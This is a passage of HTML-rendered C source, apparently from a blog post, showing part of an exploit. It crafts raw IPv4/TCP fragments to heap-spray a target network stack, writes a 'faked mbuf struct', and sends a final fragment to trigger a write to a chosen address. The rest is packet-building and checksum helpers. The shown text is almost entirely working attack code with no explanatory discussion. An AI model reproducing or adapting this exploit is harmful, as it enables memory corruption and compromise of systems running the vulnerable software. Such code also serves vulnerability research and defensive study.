&#125;</span><br><span class="line">    write(s, payload_start, (<span class="type">uint8_t</span> *)payload - payload_start);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we have written faked mbuf struct&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    <span class="keyword">if</span> (stop_flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;trigger!&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, write_data, write_data_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we have trigger the written to target addr.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真正malloc的大小是payloadlen + 64</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_ip_pkt</span><span class="params">(<span class="keyword">struct</span> ip_pkt_info *pkt_info, <span class="type">uint8_t</span> *payload,</span></span><br><span class="line"><span class="params">                 <span class="type">int</span> payloadlen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket() failed to get socket descriptor for using ioctl() &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">&quot;%s&quot;</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl() failed to find interface &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(pkt_info-&gt;ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = pkt_info-&gt;MF;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off =</span><br><span class="line">            htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) + (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) +</span><br><span class="line">                  ip_flags[<span class="number">3</span>] + (pkt_info-&gt;ip_off &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = pkt_info-&gt;ip_p;</span><br><span class="line">    <span class="comment">// iphdr.ip_p = IPPROTO_TCP;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), payload, payloadlen * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket() failed &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt() failed to set IP_HDRINCL &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt() failed to bind to interface &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (<span class="keyword">struct</span> sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sendto() failed &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray</span><span class="params">(<span class="type">int</span> size, <span class="type">uint16_t</span> ip_id)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcphdr</span>;</span></span><br><span class="line">    <span class="type">char</span> *payload;</span><br><span class="line">    <span class="type">int</span> payloadlen;</span><br><span class="line">    <span class="type">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line">    payload = allocate_strmem(IP_MAXPACKET);</span><br><span class="line"></span><br><span class="line">    payloadlen = size - <span class="number">84</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket() failed to get socket descriptor for using ioctl() &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">&quot;%s&quot;</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl() failed to find interface &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// dbg_printf(&quot;Index for interface %s is %i\n&quot;, interface, ifr.ifr_ifindex);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + TCP_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off = htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) +</span><br><span class="line">                         (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) + ip_flags[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TCP header</span></span><br><span class="line">    <span class="comment">// Source port number (16 bits)</span></span><br><span class="line">    tcphdr.th_sport = htons(<span class="number">60</span>);</span><br><span class="line">    <span class="comment">// Destination port number (16 bits)</span></span><br><span class="line">    tcphdr.th_dport = htons(<span class="number">80</span>);</span><br><span class="line">    <span class="comment">// Sequence number (32 bits)</span></span><br><span class="line">    tcphdr.th_seq = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Acknowledgement number (32 bits)</span></span><br><span class="line">    tcphdr.th_ack = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Reserved (4 bits): should be 0</span></span><br><span class="line">    tcphdr.th_x2 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Data offset (4 bits): size of TCP header in 32-bit words</span></span><br><span class="line">    tcphdr.th_off = TCP_HDRLEN / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flags (8 bits)</span></span><br><span class="line">    <span class="comment">// FIN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// SYN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// RST flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// PSH flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// ACK flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// URG flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// ECE flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// CWR flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    tcphdr.th_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        tcphdr.th_flags += (tcp_flags[i] &lt;&lt; i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Window size (16 bits)</span></span><br><span class="line">    tcphdr.th_win = htons(<span class="number">65535</span>);</span><br><span class="line">    <span class="comment">// Urgent pointer (16 bits): 0 (only valid if URG flag is set)</span></span><br><span class="line">    tcphdr.th_urp = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// TCP checksum (16 bits)</span></span><br><span class="line">    tcphdr.th_sum =</span><br><span class="line">            tcp4_checksum(iphdr, tcphdr, (<span class="type">uint8_t</span> *)payload, payloadlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Next part of packet is upper layer protocol header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), &amp;tcphdr, TCP_HDRLEN * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN + TCP_HDRLEN), payload,</span><br><span class="line">           payloadlen * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket() failed &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt() failed to set IP_HDRINCL &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt() failed to bind to interface &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (<span class="keyword">struct</span> sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sendto() failed &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">    <span class="built_in">free</span>(payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Computing the internet checksum (RFC 1071).</span></span><br><span class="line"><span class="comment">// Note that the internet checksum does not preclude collisions.</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">checksum</span><span class="params">(<span class="type">uint16_t</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = len;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint16_t</span> answer = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sum up 2-byte values until none or only one byte left.</span></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        sum += *(addr++);</span><br><span class="line">        count -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add left-over byte, if any.</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += *(<span class="type">uint8_t</span> *)addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fold 32-bit sum into 16 bits; we lose information by doing this,</span></span><br><span class="line">    <span class="comment">// increasing the chances of a collision.</span></span><br><span class="line">    <span class="comment">// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)</span></span><br><span class="line">    <span class="keyword">while</span> (sum &gt;&gt; <span class="number">16</span>) &#123;</span><br><span class="line">        sum = (sum &amp; <span class="number">0xffff</span>) + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Checksum is one&#x27;s compliment of sum.</span></span><br><span class="line">    answer = ~sum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 ICMP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">icmp4_checksum</span><span class="params">(<span class="keyword">struct</span> icmp icmphdr, <span class="type">uint8_t</span> *payload, <span class="type">int</span> payloadlen)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line">    <span class="type">int</span> chksumlen = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>]; <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Type to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_type, <span class="keyword">sizeof</span>(icmphdr.icmp_type));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Code to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_code, <span 